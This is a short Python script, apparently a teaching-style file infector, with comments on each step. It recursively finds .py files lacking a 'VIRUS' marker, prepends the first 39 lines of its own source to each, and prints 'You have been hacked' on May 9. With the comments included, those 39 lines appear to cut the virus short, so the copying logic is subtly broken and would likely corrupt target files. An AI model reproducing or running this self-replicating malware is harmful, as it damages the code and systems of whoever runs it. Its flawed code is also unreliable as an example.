#!/usr/bin/python3
import os
import datetime

# Signature used to identify infected files
SIGNATURE = "VIRUS"

# Function to recursively locate Python files that are not infected in the specified path
def locate(path):
    files_targeted = []
    # List all files in the specified directory
    filelist = os.listdir(path)
    
    # Iterate through each file
    for fname in filelist:
        # Check if the file is a directory
        if os.path.isdir(path+"/"+fname):
            # If it's a directory, recursively call the function on that directory
            files_targeted.extend(locate(path+"/"+fname))
        # Check if the file has a '.py' extension
        elif fname[-3:] == ".py":
            # Initialize a flag to check if the file is infected
            infected = False
            # Open and read each line of the file
            for line in open(path+"/"+fname):
                # Check if the virus signature is present in the line
                if SIGNATURE in line:
                    # If the signature is found, mark the file as infected and break the loop
                    infected = True
                    break
            # If the file is not infected, add its path to the list of targeted files
            if infected == False:
                files_targeted.append(path+"/"+fname)
    return files_targeted

# Function to infect specified files with the virus code
def infect(files_targeted):
    # Open the virus file itself
    virus = open(os.path.abspath(__file__))
    virusstring = ""
    # Read the first 39 lines of the virus file and store them in a string
    for i, line in enumerate(virus):
        if 0 <= i < 39:
            virusstring += line
    # Close the virus file
    virus.close
    
    # Iterate through each targeted file
    for fname in files_targeted:
        # Open the targeted file for reading
        f = open(fname)
        # Read the entire content of the file
        temp = f.read()
        # Close the file
        f.close()
        # Open the targeted file for writing
        f = open(fname,"w")
        # Write the virus code followed by the original content back to the file
        f.write(virusstring + temp)
        # Close the file
        f.close()

# Function to print a message if the current date is May 9th
def detonate():
    # Check if the current date is May 9th
    if datetime.datetime.now().month == 5 and datetime.datetime.now().day == 9:
        # Print a message indicating that the system has been hacked
        print("You have been hacked")

# Locate Python files that are not infected in the current directory and its subdirectories
files_targeted = locate(os.path.abspath(""))
# Infect the located files with the virus code
infect(files_targeted)
# Execute the 'detonate' function to print a message if the current date is May 9th
detonate()
